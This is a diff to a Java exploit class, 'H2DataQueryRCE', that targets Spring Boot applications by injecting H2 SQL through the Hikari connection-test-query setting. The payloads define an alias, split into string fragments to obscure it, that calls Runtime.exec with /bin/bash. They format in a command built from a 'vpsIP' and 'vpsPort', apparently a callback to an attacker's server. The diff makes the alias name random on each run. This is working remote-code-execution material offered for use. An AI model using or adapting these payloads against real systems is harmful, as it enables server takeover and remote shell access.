@@ -25,7 +25,7 @@ public class H2DataQueryRCE {
     public String expData1 = "spring.datasource.hikari.connection-test-query=CREATE ALIAS %s AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL %s('/bin/bash','/c','%s');";
     public String expData2 = "{\"name\":\"spring.datasource.hikari.connection-test-query\",\"value\":\"CREATE ALIAS %s AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL %s('/bin/bash','-c','%s');\"}";
     public String flag = "T";
-    public static int count = 15;
+    public static int count;
     public H2DataQueryRCE(String address,String vpsIP,String vpsPort){
         this.address = address;
         this.vpsIP = vpsIP;
@@ -41,6 +41,7 @@ public class H2DataQueryRCE {
         String ua = "";
         disableSSLVerification();
         String cmd = String.format(cmdtmp,vpsIP,vpsPort);
+        count = (int) (Math.random() * 9000) + 1000;
         flag = "T" + String.valueOf(count);
         data = String.format(expData1,flag,flag,cmd);
         try{
@@ -123,6 +124,7 @@ public class H2DataQueryRCE {
         String ua = "";
         disableSSLVerification();
         String cmd = String.format(cmdtmp,vpsIP,vpsPort);
+        count = (int) (Math.random() * 9000) + 1000;
         flag = "T" + String.valueOf(count);
         data = String.format(expData2,flag,flag,cmd);
         try{
